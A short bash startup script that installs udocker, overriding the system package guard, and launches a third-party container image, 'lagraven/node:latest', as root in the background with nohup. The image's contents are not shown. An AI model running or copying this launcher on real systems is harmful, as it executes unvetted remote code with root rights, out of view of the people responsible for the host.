#!/bin/bash
pip install udocker --break-system-packages
nohup udocker --allow-root-run lagraven/node:latest &
# START APP





